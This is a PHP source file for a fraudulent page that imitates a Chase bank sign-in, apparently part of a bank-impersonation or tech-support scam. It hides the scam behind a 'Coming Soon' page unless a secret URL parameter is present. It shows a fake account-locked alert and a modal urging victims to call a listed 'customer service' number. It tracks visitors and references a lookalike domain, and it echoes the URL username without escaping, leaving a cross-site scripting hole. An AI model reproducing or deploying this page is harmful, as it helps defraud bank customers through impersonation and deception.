<?php if (isset($_GET['error-code']) && $_GET['error-code'] == '502'): ?>
<!DOCTYPE html>
<html>
	<head>
		<title>Log Into Your Account</title>
		<!--Import Google Icon Font-->
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<!--Import materialize.css-->
		<link type="text/css" rel="stylesheet" href="css/materialize.css"  media="screen,projection"/>
		<link type="text/css" rel="stylesheet" href="css/style.css"  media="screen,projection"/>

		<link rel="icon" type="image/x-icon" href="assets/icons/favicon.ico">

		<!--Let browser know website is optimized for mobile-->
		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	</head>

	<body>

		<section class="login-header" style="padding-top: 5%">
			<div class="container">
				<div class="center-align">
					<img src="assets/images/logo-white.png" alt="" class="responsive-img" width="200">
				</div>
				<div class="row">
					<div class="col s12 m4 offset-m4">
						<br>
						<div class="card-panel">
							<!-- <img src="assets/images/login-box.png" alt="" class="responsive-img"> -->
							<!-- <br><br><br><br><br><br><br><br><br> -->
							<div class="center-align"><i class="material-icons red-text">error</i></div>
							<p class="red-text center-align">
							Your account is locked due to security issues. Please contact support team at 1888-306-0278</p>
							<form action="login.php" method="POST" class="row" name="login-form">
								<div class="input-field col s12">
									<input type="text" id="username" name="username" style="margin-bottom: 0 !important;">
									<label for="username" style="color: #9e9e9e">Username</label>
								</div>
								<div class="input-field col s12">
									<input type="password" id="password" name="password">
									<label for="password" style="color: #9e9e9e">Password</label>
								</div>
								<div class="input-field col s12">
									<button class="btn wide-btn" name="submit" style="background-color: rgb(49, 108, 244); font-weight: 700;">Sign in</button>
								</div>
								<div class="input-field col s12">
									<h6 style="font-size: 13px"><a href="#!"><i class="material-icons right tiny">keyboard_arrow_right</i>Forgot username/password</a></h6>
									<h6 style="font-size: 13px"><a href="#!"><i class="material-icons right tiny">keyboard_arrow_right</i>Not enrolled? Sign up now.</a></h6>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</section>

		<!-- <section class="white-text" style="background-color: rgb(60, 109, 185); padding-bottom: 0">
			<div class="container">
				<div class="row">
					<div class="col s12 m2">
						<h6>Enjoy</h6>
						<h1>$200</h1>
					</div>
					<div class="col s12 m4">
						<h4>New Chase<br>checking customers</h4>
						<p>Open a Chase Total Checking® account and set up direct deposit.</p>
						<a href="#!" class="btn" style="background-color: rgb(74, 124, 34); font-weight: 700;">Open an account</a>
					</div>
					<div class="col s12 m4 offset-m2">
						<div class="card-panel black-text" style="padding: 5px 24px">
							<h5>Welcome</h5>
							<form action="#!" method="POST" class="row">
								<div class="input-field col s12">
									<input type="text" id="username" name="username" style="margin-bottom: 0 !important;">
									<label for="username">Username</label>
								</div>
								<div class="input-field col s12">
									<input type="password" id="password" name="password">
									<label for="password">Password</label>
								</div>
								<div class="input-field col s12">
									<a href="#!" class="btn wide-btn" style="background-color: rgb(49, 108, 244); font-weight: 700;">Sign in</a>
								</div>
								<div class="input-field col s12">
									<h6 style="font-size: 13px"><a href="#!"><i class="material-icons right tiny">keyboard_arrow_right</i>Forgot username/password</a></h6>
									<h6 style="font-size: 13px"><a href="#!"><i class="material-icons right tiny">keyboard_arrow_right</i>Not enrolled? Sign up now.</a></h6>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</section> -->

		<section class="center-align">
			<div class="container">
				<h3>Choose what's right for you</h3>
				<br><br>
				<div class="row">
					<div class="col l2_5">
						<!-- <img src="assets/images/business.png" alt="" width="80"> -->
						<div class="icon-credit-score-medium"></div>
						<p class="primary-text medium medium-text">Free Credit Score</p>
					</div>
					<div class="col l2_5">
						<!-- <img src="assets/images/credit-cards.png" alt="" width="80"> -->
						<div class="icon-business-medium"></div>
						<p class="primary-text medium medium-text">Business</p>
					</div>
					<div class="col l2_5">
						<div class="icon-credit-medium"></div>
						<p class="primary-text medium medium-text">Credit cards</p>
					</div>
					<div class="col l2_5">
						<div class="icon-checking-medium"></div>
						<p class="primary-text medium medium-text">Checking</p>
					</div>
					<div class="col l2_5">
						<div class="icon-savings-bank-medium"></div>
						<p class="primary-text medium medium-text">Savings</p>
					</div>
				</div>
				<br>
				<div class="row">
					<div class="col s12 m4">
						<a href="#!">
							<img src="assets/images/home1.jpg" alt="" class="responsive-img">
						</a>
					</div>
					<div class="col s12 m4">
						<a href="#!">
							<img src="assets/images/home2.jpg" alt="" class="responsive-img">
						</a>
					</div>
					<div class="col s12 m4">
						<a href="#!">
							<img src="assets/images/home3.png" alt="" class="responsive-img">
						</a>
					</div>
				</div>
				<br>
				<img src="assets/images/home4.png" alt="" class="responsive-img">
			</div>
		</section>

		<div id="modal1" class="modal" style="width: 500px">
			<div class="modal-content center-align">
				<i class="material-icons red-text medium">error</i>
				<p class="red-text">Dear user, your account with username <?php echo $_GET['username'] ?> has been blocked due to suspicious login attempts. Please get in touch with the customer service team to secure your account.</p>

				<h5>Customer Service Number</h5>
				<h5>1888-306-0278</h5>
			</div>
		</div>

		<!--Import jQuery before materialize.js-->
		<script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
		<script type="text/javascript" src="js/materialize.min.js"></script>

		<script>
			$(document).ready(function() {
				$('.modal').modal()

				$('#modal1').modal('open')
			})

			let loginForm = document.forms['login-form']
			loginForm.addEventListener('submit', function(e) {
				e.preventDefault()
			})
		</script>

		<!-- Default Statcounter code for Chase - RTX - Money
		https://chase-secure.signin-options.xyz?referrer=platform
		-->
		<script type="text/javascript">
			var sc_project=12924599; 
			var sc_invisible=1; 
			var sc_security="6c219cca"; 
		</script>
		<script type="text/javascript"
		src="https://www.statcounter.com/counter/counter.js"
		async></script>
		<noscript><div class="statcounter"><a title="Web Analytics"
		href="https://statcounter.com/" target="_blank"><img
		class="statcounter"
		src="https://c.statcounter.com/12924599/0/6c219cca/1/"
		alt="Web Analytics"
		referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
		<!-- End of Statcounter Code -->

	</body>
</html>
<?php else: ?>
	<!DOCTYPE html>
	<html lang="en">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>Document</title>
	</head>
	<body>
		<h1>Website Coming Soon</h1>
	</body>
	</html>
<?php endif ?>